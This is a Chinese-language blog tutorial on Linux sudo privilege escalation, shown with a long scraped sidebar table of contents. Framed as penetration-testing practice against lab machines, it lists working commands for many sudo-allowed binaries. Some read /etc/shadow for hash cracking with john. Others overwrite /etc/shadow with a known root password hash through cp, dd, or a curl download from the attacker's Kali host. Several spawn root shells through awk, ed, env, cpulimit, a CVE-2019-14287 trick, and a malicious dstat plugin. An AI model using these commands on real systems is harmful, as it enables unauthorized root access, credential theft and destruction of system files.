class="toc-text">sudo nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-36"><span class="toc-number">41.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-28"><span class="toc-number">41.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-node"><span class="toc-number">42.</span> <span class="toc-text">sudo node</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-37"><span class="toc-number">42.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-29"><span class="toc-number">42.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-nohup"><span class="toc-number">43.</span> <span class="toc-text">sudo nohup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-38"><span class="toc-number">43.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-30"><span class="toc-number">43.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-openvpn"><span class="toc-number">44.</span> <span class="toc-text">sudo openvpn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-39"><span class="toc-number">44.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-31"><span class="toc-number">44.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-passwd"><span class="toc-number">45.</span> <span class="toc-text">sudo passwd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-40"><span class="toc-number">45.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-32"><span class="toc-number">45.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-perl"><span class="toc-number">46.</span> <span class="toc-text">sudo perl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-41"><span class="toc-number">46.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-33"><span class="toc-number">46.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-php"><span class="toc-number">47.</span> <span class="toc-text">sudo php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-42"><span class="toc-number">47.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-34"><span class="toc-number">47.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-pico"><span class="toc-number">48.</span> <span class="toc-text">sudo pico</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-43"><span class="toc-number">48.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-35"><span class="toc-number">48.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-pkexec"><span class="toc-number">49.</span> <span class="toc-text">sudo pkexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-44"><span class="toc-number">49.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-36"><span class="toc-number">49.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-python3"><span class="toc-number">50.</span> <span class="toc-text">sudo python3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-45"><span class="toc-number">50.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-37"><span class="toc-number">50.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-rvim"><span class="toc-number">51.</span> <span class="toc-text">sudo rvim</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-46"><span class="toc-number">51.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-38"><span class="toc-number">51.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-scp"><span class="toc-number">52.</span> <span class="toc-text">sudo scp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90-47"><span class="toc-number">52.1.</span> <span class="toc-text">漏洞利用前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E5%BC%8F-39"><span class="toc-number">52.2.</span> <span class="toc-text">操作方式</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://lunereal.1kal0vic.top/2025/11/29/Linux%E6%8F%90%E6%9D%83/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="伊卡洛维奇"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ikalovic@Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">linux sudo提权</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-11-29 17:46:23" itemprop="dateCreated datePublished" datetime="2025-11-29T17:46:23+08:00">2025-11-29</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">-web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">-web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><pre><code>在进行渗透测试获取初始立足点的shell后，通常会运行sudo -l查看当前用户的权限，可通过系统已有可执行文件的权限实现提权。提权的本质就是低权限的用户因为某种特殊的配置/漏洞，可利用具有高权限的指令/工具/脚本等执行高权限的操作。有关Linux系统的提权方法有很多，包含passwd或shadow文件利用提权、自动任务提权、SUID提权、内核漏洞提权、第三方工具提权、sudo提权等等，本文将详解十几种sudo提权的方法。
+</code></pre>
+<h2 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h2><p><code>sudo -l</code></p>
+<h2 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
+<h2 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h2><h3 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>1.sudo版本要求：该漏洞针对1.8.28以下的sudo版本。查看sudo版本的指令是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -V |grep version</span><br></pre></td></tr></table></figure>
+
+<p>2.运行sudo -l后显示当前用户可以免密切换至其他任意非root用户，即：</p>
+<p><code>(ALL, !root) NOPASSWD: /bin/bash</code></p>
+<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-apt和sudo-apt-get"><a href="#sudo-apt和sudo-apt-get" class="headerlink" title="sudo apt和sudo apt-get"></a>sudo apt和sudo apt-get</h2><h3 id="漏洞利用前提-1"><a href="#漏洞利用前提-1" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行apt指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/apt</code></p>
+<h3 id="提权操作-1"><a href="#提权操作-1" class="headerlink" title="提权操作"></a>提权操作</h3><p>针对sudo apt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>针对 sudo apt-get</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h2><h3 id="漏洞利用前提-2"><a href="#漏洞利用前提-2" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行apt指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/sbin/apache2</code></p>
+<h3 id="操作方式"><a href="#操作方式" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>其中-f用于指定apache2的配置文件，我们指定存放了密码hash的文件&#x2F;etc&#x2F;shadow。执行时由于给定的配置文件有问题，肯定会出现报错，报错的时候会暴露&#x2F;etc&#x2F;shadow文件的第一行，从而给我们利用的可能。报错信息如下：</p>
+<figure class="highlight plaintext"><figcaption><span>error on line 1 of</span><a href="/etc/shadow:">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid command &#x27;root:$6$TB/euwMK$0XA............:::&#x27;,perhaps mispelled or defined by a module not in cluded in the server configuration</span><br></pre></td></tr></table></figure>
+
+<p> 这样我们把其中关于root账号的密码hash$6$TB&#x2F;euwMK$0XA…………（此处这个hash只是示意）找个字典破解一下，有可能就能拿到密码。比如可以把密码hash命名为passwordhash，然后在kali中用john破解一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john passwordhash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-ash"><a href="#sudo-ash" class="headerlink" title="sudo ash"></a>sudo ash</h2><h3 id="漏洞利用前提-3"><a href="#漏洞利用前提-3" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行ash指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/ash</code></p>
+<h3 id="操作方式-1"><a href="#操作方式-1" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ash</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>直接运行sudo ash即可提权，本质上ash就是启动一个shell的命令。既然可以以高权限启动，相当于直接提权，再用命令bash开启一个会话提高shell的交互性。这里的关键在于认出ash就是一种shell环境。与之类似还有bash&#x2F;csh&#x2F;zsh&#x2F;sh&#x2F;tclsh&#x2F;dash等，均为shell环境。</p>
+<h2 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h2><h3 id="漏洞利用前提-4"><a href="#漏洞利用前提-4" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行ash指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/awk</code></p>
+<h3 id="操作方式-2"><a href="#操作方式-2" class="headerlink" title="操作方式"></a>操作方式</h3><p><code>sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></p>
+<p> awk是常用的文本处理工具之一，上述命令中单引号中的内容是传递给awk工具的脚本，而BEGIN是awk工具的一个特殊模式，表示在处理任何输入前执行的动作，我们用大括号{}添加了指定awk执行的操作：系统命令——启动一个shell环境，从而实现提权。</p>
+<h2 id="sudo-base32-58-64-nc-z"><a href="#sudo-base32-58-64-nc-z" class="headerlink" title="sudo base32&#x2F;58&#x2F;64&#x2F;nc&#x2F;z"></a>sudo base32&#x2F;58&#x2F;64&#x2F;nc&#x2F;z</h2><h3 id="漏洞利用前提-5"><a href="#漏洞利用前提-5" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行base32&#x2F;58&#x2F;64&#x2F;nc&#x2F;z指令。即运行sudo -l后会有如下的行（此处以base4为例）：</p>
+<p><code>(root) NOPASSWD: /usr/bin/base64</code></p>
+<h3 id="操作方式-3"><a href="#操作方式-3" class="headerlink" title="操作方式"></a>操作方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo base64 &quot;$bossfrank&quot; | base64 -d</span><br></pre></td></tr></table></figure>
+
+<p> base64就是用来编码的，具有sudo权限后可以读取高权限用户才能读取的文件。我们可以利用base64工具的权限，对敏感其进行编码再解码，读取结果（也就是读取原始文件）。 利用这种方式我们就可读取原本的shadow文件，然后再对root用户的hash进行字典碰撞破解，如果破解成功，即可su提权。（base64&#x2F;58&#x2F;32&#x2F;nc&#x2F;z的利用方式相似）</p>
+<h2 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h2><h3 id="漏洞利用前提-6"><a href="#漏洞利用前提-6" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行复制cp指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/cp</code></p>
+<h3 id="操作方式-4"><a href="#操作方式-4" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p> 本质思路就是利用复制的高权限，我们可以自己写一个shadow文件，通过复制操作覆盖原有的shadow文件，从而修改了root账户的密码，用新的密码进行提权。</p>
+<p>详情可见cp | GTFOBins，具体操作如下：</p>
+<p> 首先我们可以用mkpasswd生成sha-512加密（&#x2F;etc&#x2F;shadow中密码的加密方式）的密文，我们企图把root账户的密码修改为123456，故此处命令为：<br><code>mkpasswd -m sha-512 123456</code></p>
+<p>加密结果为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.</span><br></pre></td></tr></table></figure>
+
+<p> 查看kali的&#x2F;etc&#x2F;shadow可以看到通常情况下shadow的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow | grep root </span><br></pre></td></tr></table></figure>
+
+<p> 照着这个形式，我们可以构造一行如下的字符串，这行字符串之后会拷贝覆盖靶机中的&#x2F;etc&#x2F;shadow文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机中进行如下的操作：</p>
+<p>首先声明一个环境变量，用于指向&#x2F;etc&#x2F;shadow：</p>
+<p><code>bossfrank=/etc/shadow</code></p>
+<p>然后再生成一个名为TF的变量，指向用mktemp生成的临时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br></pre></td></tr></table></figure>
+
+<p>然后将刚刚我们生成的shadow记录（即root账户密码是123456）写入TF变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::&#x27; &gt; $TF</span><br></pre></td></tr></table></figure>
+
+<p>插叙一下，此时可以查看TF变量的内容，输出TF（echo $TF）可以看到：</p>
+<p><code> /tmp/tmp.Rmzxhak</code></p>
+<p> 再查看这个临时文件（cat &#x2F;tmp&#x2F;tmp.Rmzxhak），就是我们刚刚的那条shadow记录</p>
+<p>最后是关键步骤，使用sudo的cp复制指令，将我们的这条shadow记录复制到&#x2F;etc&#x2F;shadow，实现覆盖操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/cp $TF $bossfrank</span><br></pre></td></tr></table></figure>
+
+<h2 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h2><h3 id="漏洞利用前提-7"><a href="#漏洞利用前提-7" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行cpulimit指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/cpulimit</code></p>
+<h3 id="提权操作-2"><a href="#提权操作-2" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cpulimit -l 100 -f /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 其中-l 100用于限制（指定）cpu的使用率，此处为100%，-f参数表示运行某个程序，该程序以-l参数指定的使用率占用CPU，此处执行的程序就是启动&#x2F;bash，由于cpulimit具有sudo权限，故可以直接提权。</p>
+<h2 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h2><h3 id="漏洞利用前提-8"><a href="#漏洞利用前提-8" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行curl指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/curl</code></p>
+<h3 id="操作方式-5"><a href="#操作方式-5" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p> 该操作的本质思路与sudo cp小节的类似，都是通过覆盖系统的&#x2F;etc&#x2F;shadow文件修改root密码，达到提权的目的。前述生成shadow格式的操作见sudo cp小节，这里把对于123456进行sha-512加密的shadow形式的字符串存成了一个文件shadow_entry，这就是我们的payload：</p>
+<p> 在kali中启动一个http服务，架设一个站点，用于存放这个恶意载荷payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0:80 </span><br></pre></td></tr></table></figure>
+
+<p> 然后在靶机中通过sudo curl访问kali上的payload，也就是这个shadow_entry，并<strong>把结果输出到&#x2F;etc&#x2F;shadow，从而覆盖了靶机原有的&#x2F;etc&#x2F;shadow文件，实现了对root账户的密码修改</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://kali的ip/shadow_entry -o /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>-o参数用于将结果输出到文件，接下来只要su提权，输入我们的密码即可。该方法同样由于覆盖了原有的&#x2F;etc&#x2F;shadow，对靶机的系统是有破坏的。</p>
+<h2 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h2><h3 id="漏洞利用前提-9"><a href="#漏洞利用前提-9" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行日期date指令。即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/date</code></p>
+<h3 id="操作方式-6"><a href="#操作方式-6" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>sudo date命令的提权操作与sudo apache2的操作相似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo date -f /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>其中-f用于指定读取日期的路径。我们利用date的sudo权限从&#x2F;etc&#x2F;shadow中读取日期，&#x2F;etc&#x2F;shadow中不存在日期信息，会出现报错，但报错中会显示&#x2F;etc&#x2F;shadow的内容。</p>
+<p> 然后执行hash碰撞即可。 </p>
+<h2 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a>sudo dd</h2><h3 id="漏洞利用前提-10"><a href="#漏洞利用前提-10" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行dd指令。 即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/dd</code></p>
+<h3 id="操作方式-7"><a href="#操作方式-7" class="headerlink" title="操作方式"></a><strong>操作方式</strong></h3><p>dd指令是一个命令行工具，可对原始指令进行复制、转化，可以用于转换编码、生成文件等。 </p>
+<p>该提权方法与前述的sudo cp 和 sudo curl有类似之处，都是通过覆盖&#x2F;etc&#x2F;shadow文件的方法，覆盖后使用自己的设定的密码进行登录。首先还是先构造一个shadow形式的字符串，设定密码为123456（方法详见sudo cp）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p> 运行如下指令即可实现对靶机&#x2F;etc&#x2F;shadow文件的覆盖：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::&quot; | sudo dd of=/etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>of参数用于输出文件，这里设置为&#x2F;etc&#x2F;shadow，就会将我们构造的payload输出到&#x2F;etc&#x2F;shadow，实现对靶机中&#x2F;etc&#x2F;shadow的覆盖。 同样，这对于靶机也是有损的，建议先备份原有的&#x2F;etc&#x2F;shadow。</p>
+<h2 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h2><h3 id="漏洞利用前提-11"><a href="#漏洞利用前提-11" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行dstat指令。 即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/dstat</code></p>
+<h3 id="提权操作-3"><a href="#提权操作-3" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><p> 该操作的核心逻辑是dstat指令可以指定插件，我们可以在插件目录中写入我们用于提权的exp脚本，然后sudo运行dstat的时候同时指定这个插件脚本，即可实现提权。dstat的插件目录通常位于&#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat或&#x2F;usr&#x2F;share&#x2F;dstat，可以先通过find命令进行查找到底是哪个目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name dstat -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p> 这里假定插件目录是&#x2F;usr&#x2F;share&#x2F;dstat，我们在这个目录中写入我们的python提权脚本（插件）dstat_exp.py：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os; os.execv(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;sh&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以直接echo到指定目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27; &gt;/usr/local/share/dstat/dstat_exp.py</span><br></pre></td></tr></table></figure>
+
+<p>然后sudo运行dstat的时候指定插件名exp即可提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dstat --exp</span><br></pre></td></tr></table></figure>
+
+<p>注意此处我们插件的脚本名称是dstat_exp.py，但指定插件名称时输入的是exp。</p>
+<h2 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h2><h3 id="漏洞利用前提-12"><a href="#漏洞利用前提-12" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行文本编辑器ed。 即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/ed</code></p>
+<h3 id="提权操作-4"><a href="#提权操作-4" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><p>直接sudo运行ed即可进入文本编辑界面，然后输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p> 即可直接提权。感叹号!表明执行系统命令。我们执行的系统命令是&#x2F;bin&#x2F;bash，即启动bash，又由于ed本身是以sudo执行的，从而启动了root的bash，实现了提权。</p>
+<h2 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h2><h3 id="漏洞利用前提-13"><a href="#漏洞利用前提-13" class="headerlink" title="漏洞利用前提"></a><strong>漏洞利用前提</strong></h3><p>当前用户可以以sudo高级权限运行文本编辑器ed。 即运行sudo -l后会有如下的行：</p>
+<p><code>(root) NOPASSWD: /usr/bin/ed</code></p>
+<h3 id="提权操作-5"><a href="#提权操作-5" class="headerlink" title="提权操作"></a><strong>提权操作</strong></h3><p>直接sudo运行env执行&#x2F;bin&#x2F;bash即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>env通常用于设定环境变量相关的参数，在此处也可以执行命令，直接以启动bash即可提权。</p>
